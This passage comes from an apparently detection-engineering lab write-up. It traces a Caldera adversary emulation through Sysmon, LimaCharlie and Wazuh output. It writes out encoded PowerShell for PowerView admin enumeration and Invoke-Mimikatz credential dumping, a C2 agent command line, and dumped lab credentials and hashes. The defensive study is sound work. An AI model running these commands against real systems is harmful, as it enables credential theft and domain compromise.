+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\nbtstat.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: TCP/IP NetBios Information
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: nbtinfo.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: &#34;</span>C:\Windows\system<span style=color:#bd93f9>32</span>\nbtstat.exe<span style=color:#f1fa8c>&#34; -n
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=004091B8024936FF322C11CF370F2184,SHA256=6210FA6ADE115DD07409CFAE21683B1772D6D3FDB6B438814CACBD3588DAD9E3,IMPHASH=207F3D1F113DEB58D9E4C6ACA8E0FA3F
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-a14c-68db-0e05-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 7624
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Windows\System<span style=color:#bd93f9>32</span>\WindowsPowerShell\v<span style=color:#bd93f9>1.0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc bgBiAHQAcwB0AGEAdAAgAC0AbgA=
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><h2 id=step-3---discover-admins>Step 3 - Discover Admins:</h2><p><strong>Base64:</strong></p><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
+</code></pre><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGMAbABpAGUAbgB0ADIALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
+</code></pre><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGMAbABpAGUAbgB0ADEALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
+</code></pre><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGEAZAAtAGQAYwAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
+</code></pre><p><strong>Decoded:</strong></p><pre tabindex=0><code>Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName exchange.ssnrshnn.local
+</code></pre><pre tabindex=0><code>Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName client2.ssnrshnn.local
+</code></pre><pre tabindex=0><code>Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName client1.ssnrshnn.local
+</code></pre><pre tabindex=0><code>Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName ad-dc.ssnrshnn.local
+</code></pre><p><strong>Command Output:</strong></p><p>In this step attacker aimed to collect local group membership informations for each host that have been found.</p><pre tabindex=0><code>ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : EXCHANGE\Administrator
+SID          : S-1-5-21-1945855000-140921441-2322798616-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : True
+
+ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Organization Management
+SID          : S-1-5-21-2105100566-3451255-233295498-1111
+IsGroup      : True
+IsDomain     : True
+
+ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Exchange Trusted Subsystem
+SID          : S-1-5-21-2105100566-3451255-233295498-1126
+IsGroup      : True
+IsDomain     : True
+</code></pre><pre tabindex=0><code>ComputerName : client2.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT2\Administrator
+SID          : S-1-5-21-1149899384-3851703988-751053742-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client2.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT2\client2
+SID          : S-1-5-21-1149899384-3851703988-751053742-1001
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client2.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : True
+</code></pre><pre tabindex=0><code>ComputerName : client1.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT1\Administrator
+SID          : S-1-5-21-4174197286-1528992158-1233857966-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client1.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT1\client1
+SID          : S-1-5-21-4174197286-1528992158-1233857966-1001
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client1.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : True
+</code></pre><pre tabindex=0><code>ComputerName : ad-dc.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Administrator
+SID          : S-1-5-21-2105100566-3451255-233295498-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : ad-dc.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Enterprise Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-519
+IsGroup      : True
+IsDomain     : False
+
+ComputerName : ad-dc.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : False
+</code></pre><p><strong>LimaCharlie:</strong></p><p><img src=/images/calderaalice/14.png alt=alice></p><p><img src=/images/calderaalice/15.png alt=alice></p><p>Above you can see the first command of the Step 3. Since rest of the processes that are associated with this step are same I will no put their screenshots.</p><p><strong>LimaCharlie Detection:</strong></p><p>First Process:</p><p><img src=/images/calderaalice/22.png alt=alice></p><p><strong>Detection Rules that are matched with relevant processes:</strong></p><ul><li><strong>ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0</strong></li><li><strong>soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a</strong></li></ul><p><strong>Wazuh Output:</strong></p><p>First Process:</p><p><img src=/images/calderaalice/26.png alt=alice></p><p><strong>Sysmon Output</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:23:11.488
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a17f-68db-1205-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 10668
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: Windows PowerShell
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: PowerShell.EXE
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc SQBtAHAAbwByAHQALQBNAG<span style=color:#bd93f9>8</span>AZAB<span style=color:#bd93f9>1</span>AGwAZQAgAC<span style=color:#bd93f9>4</span>AXABwAG<span style=color:#bd93f9>8</span>AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBOAGUAdABMAG<span style=color:#bd93f9>8</span>AYwBhAGwARwByAG<span style=color:#bd93f9>8</span>AdQBwAE<span style=color:#bd93f9>0</span>AZQBtAGIAZQByACAALQBDAG<span style=color:#bd93f9>8</span>AbQBwAHUAdABlAHIATgBhAG<span style=color:#bd93f9>0</span>AZQAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG<span style=color:#bd93f9>4</span>AbgAuAGwAbwBjAGEAbAA=<span style=color:#f1fa8c>&#34;
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 8008
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Users\Public\Client1.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Users\Public\Client<span style=color:#bd93f9>1</span>.exe<span style=color:#f1fa8c>&#34; -server http://10.1.4.40:8888 -group red 
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><h2 id=step-4---powercatz>Step 4 - Powercatz:</h2><p><strong>Base64:</strong></p><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABpAG4AdgBvAGsAZQAtAG0AaQBtAGkALgBwAHMAMQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA=
+</code></pre><p><strong>Decoded:</strong></p><pre tabindex=0><code>Import-Module .\invoke-mimi.ps1;Invoke-Mimikatz -DumpCreds
+</code></pre><p><strong>Command Output:</strong></p><p>This command is used for credential dumping—extracting passwords and authentication tokens from memory. In this attack, <strong>Mimikatz</strong> will read credentials from the <strong>lsass</strong> process.</p><pre tabindex=0><code>  
+  .#####.   mimikatz 2.2.0 (x64) #19041 Jun 16 2020 13:40:08
+ .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 19027857 (00000000:01225791)
+Session           : CachedInteractive from 1
+User Name         : goadmin
+Domain            : SSNRSHNN
+Logon Server      : AD-DC
+Logon Time        : 30/09/2025 09:18:58
+SID               : S-1-5-21-2105100566-3451255-233295498-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : goadmin
+	 * Domain   : SSNRSHNN
+	 * NTLM     : [redacted]
+	 * SHA1     : [redacted]
+	 * DPAPI    : [redacted]
+	tspkg :	
+	wdigest :	
+	 * Username : goadmin
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : goadmin
+	 * Domain   : SSNRSHNN.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 16672627 (00000000:00fe6773)
+Session           : CachedInteractive from 1
+User Name         : goadmin
+Domain            : SSNRSHNN
+Logon Server      : AD-DC
+Logon Time        : 30/09/2025 09:06:30
+SID               : S-1-5-21-2105100566-3451255-233295498-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : goadmin
+	 * Domain   : SSNRSHNN
+	 * NTLM     : [redacted]
+	 * SHA1     : [redacted]
+	 * DPAPI    : [redacted]
+	tspkg :	
+	wdigest :	
+	 * Username : goadmin
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : goadmin
+	 * Domain   : SSNRSHNN.LOCAL
+	 * Password : Test123!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 15732580 (00000000:00f00f64)
+Session           : Interactive from 1
+User Name         : client1
+Domain            : SSNRSHNN
+Logon Server      : AD-DC
+Logon Time        : 30/09/2025 09:05:44
+SID               : S-1-5-21-2105100566-3451255-233295498-1103
+	msv :	
+	 [00000003] Primary
+	 * Username : client1
+	 * Domain   : SSNRSHNN
+	 * NTLM     : [redacted]
+	 * SHA1     : [redacted]
+	 * DPAPI    : [redacted]
+	tspkg :	
+	wdigest :	
+	 * Username : client1
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : client1
+	 * Domain   : SSNRSHNN.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 67841 (00000000:00010901)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * NTLM     : [redacted]
+	 * SHA1     : [redacted]
+	 * DPAPI    : [redacted]
+	tspkg :	
+	wdigest :	
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : CLIENT1$
+	 * Domain   : ssnrshnn.local
+	 * Password : [redacted]
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 67810 (00000000:000108e2)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * NTLM     : [redacted]
+	 * SHA1     : [redacted]
+	 * DPAPI    : [redacted]
+	tspkg :	
+	wdigest :	
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : CLIENT1$
+	 * Domain   : ssnrshnn.local
+	 * Password : hus?Z=m&lt;&#39;7zC!!(9FefUrzUrEXL*,1:&gt;#XwO?b&amp;!&lt;s##&#39;&#39;9i_&#34;DcF.o@Y;Y-4M#jp9r[:11_PbY&lt;\aVxsYe3r)?fYR^&#39;it: OFl#AblR0iI;(.4fWy=)ViLD
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : CLIENT1$
+Domain            : SSNRSHNN
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
+	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
+	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
+	tspkg :	
+	wdigest :	
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : client1$
+	 * Domain   : SSNRSHNN.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 42918 (00000000:0000a7a6)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
+	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
+	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
+	tspkg :	
+	wdigest :	
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : CLIENT1$
+	 * Domain   : ssnrshnn.local
+	 * Password : hus?Z=m&lt;&#39;7zC!!(9FefUrzUrEXL*,1:&gt;#XwO?b&amp;!&lt;s##&#39;&#39;9i_&#34;DcF.o@Y;Y-4M#jp9r[:11_PbY&lt;\aVxsYe3r)?fYR^&#39;it: OFl#AblR0iI;(.4fWy=)ViLD
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 42896 (00000000:0000a790)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
+	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
+	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
+	tspkg :	
+	wdigest :	
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : CLIENT1$
+	 * Domain   : ssnrshnn.local
+	 * Password : hus?Z=m&lt;&#39;7zC!!(9FefUrzUrEXL*,1:&gt;#XwO?b&amp;!&lt;s##&#39;&#39;9i_&#34;DcF.o@Y;Y-4M#jp9r[:11_PbY&lt;\aVxsYe3r)?fYR^&#39;it: OFl#AblR0iI;(.4fWy=)ViLD
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 41071 (00000000:0000a06f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * NTLM     : 0b6afa235668fcb2641ccc1bad163522
+	 * SHA1     : f7dd57ec4de77798f1954814ac8fbef0d5e0b1c4
+	 * DPAPI    : f7dd57ec4de77798f1954814ac8fbef0
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : CLIENT1$
+Domain            : SSNRSHNN
+Logon Server      : (null)
+Logon Time        : 30/09/2025 08:40:58
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : CLIENT1$
+	 * Domain   : SSNRSHNN
+	 * Password : (null)
+	kerberos :	
+	 * Username : client1$
+	 * Domain   : SSNRSHNN.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(powershell) # exit
+Bye!
+</code></pre><p><strong>LimaCharlie:</strong></p><p><img src=/images/calderaalice/27.png alt=alice></p><p><strong>Process Tree:</strong></p><p><img src=/images/calderaalice/31.png alt=alice></p><p>Here is the sensitive <strong>lsass</strong> process used by the attacker, which is part of this attack as well:</p><p><img src=/images/calderaalice/301.png alt=alice></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2</span><span><span style=color:#ff79c6>&#34;EVENTS&#34;</span>:[
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3</span><span>{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4</span><span><span style=color:#ff79c6>&#34;event&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5</span><span><span style=color:#ff79c6>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695010410496</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\system32\lsass.exe&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7</span><span><span style=color:#f1fa8c>&#34;CREATION_TIME&#34;</span>:<span style=color:#bd93f9>1759214458410</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
